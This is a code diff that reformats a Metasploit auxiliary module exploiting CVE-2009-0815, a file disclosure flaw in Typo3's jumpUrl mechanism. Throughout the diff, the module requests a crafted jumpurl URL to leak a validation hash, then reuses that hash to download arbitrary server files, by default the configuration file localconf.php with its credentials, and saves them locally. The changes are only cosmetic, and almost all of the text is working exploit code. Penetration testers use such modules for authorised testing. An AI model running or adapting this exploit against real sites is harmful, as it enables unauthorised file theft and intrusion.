@@ -7,49 +7,50 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Typo3 sa-2009-002 File Disclosure',
-      'Description'    => %q{
-        This module exploits a file disclosure vulnerability in the jumpUrl mechanism of
-      Typo3. This flaw can be used to read any file that the web server user account has
-      access to.
-
-      },
-      'Author'         => [ 'spinbad <spinbad.security[at]googlemail.com>' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Typo3 sa-2009-002 File Disclosure',
+        'Description' => %q{
+          This module exploits a file disclosure vulnerability in the jumpUrl mechanism of
+          Typo3. This flaw can be used to read any file that the web server user account has
+          access to.
+        },
+        'Author' => [ 'spinbad <spinbad.security[at]googlemail.com>' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['OSVDB', '52048'],
           ['CVE', '2009-0815'],
           ['URL', 'http://secunia.com/advisories/33829/'],
           ['EDB', '8038'],
           ['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-002/'],
         ],
-      'DisclosureDate' => '2009-02-10',
-      'Actions'        =>
-        [
+        'DisclosureDate' => '2009-02-10',
+        'Actions' => [
           ['Download', 'Description' => 'Download arbitrary file']
         ],
-      'DefaultAction'  => 'Download'
-      ))
+        'DefaultAction' => 'Download'
+      )
+    )
 
     register_options(
       [
         OptString.new('URI', [true, "Typo3 Path", "/"]),
         OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
-        OptString.new('LFILE',[true, "The local filename to store the data", "localconf.php"]),
-      ])
+        OptString.new('LFILE', [true, "The local filename to store the data", "localconf.php"]),
+      ]
+    )
   end
 
   def run
     print_status("Establishing a connection to the target...")
 
-    error_uri = datastore['URI'] + "/index.php?jumpurl=" +datastore['RFILE'] +"&juSecure=1&type=0&locationData=1:"
+    error_uri = datastore['URI'] + "/index.php?jumpurl=" + datastore['RFILE'] + "&juSecure=1&type=0&locationData=1:"
     ju_hash = nil
 
     res = send_request_raw({
-      'uri'     => error_uri,
-      'method'  => 'GET',
+      'uri' => error_uri,
+      'method' => 'GET',
       'headers' =>
       {
         'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
@@ -73,19 +74,18 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-
-    file_uri = datastore['URI'] + "/index.php?jumpurl=" +datastore['RFILE'] +"&juSecure=1&type=0&juHash=#{ju_hash}&locationData=1:"
+    file_uri = datastore['URI'] + "/index.php?jumpurl=" + datastore['RFILE'] + "&juSecure=1&type=0&juHash=#{ju_hash}&locationData=1:"
     print_status("Trying to get #{datastore['RFILE']}.")
 
     file = send_request_raw({
-      'uri'     => file_uri,
-      'method'  => 'GET',
+      'uri' => file_uri,
+      'method' => 'GET',
       'headers' =>
       {
         'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
         'Connection' => 'Close',
       }
-    },25)
+    }, 25)
 
     if (file and file.message = "OK")
       if file.body == 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
@@ -94,10 +94,9 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       print_status("Writing local file #{datastore['LFILE']}.")
-      open(datastore['LFILE'],'w') {|f| f << file.body }
+      open(datastore['LFILE'], 'w') { |f| f << file.body }
     else
       print_error("Error while getting file.")
     end
-
   end
 end
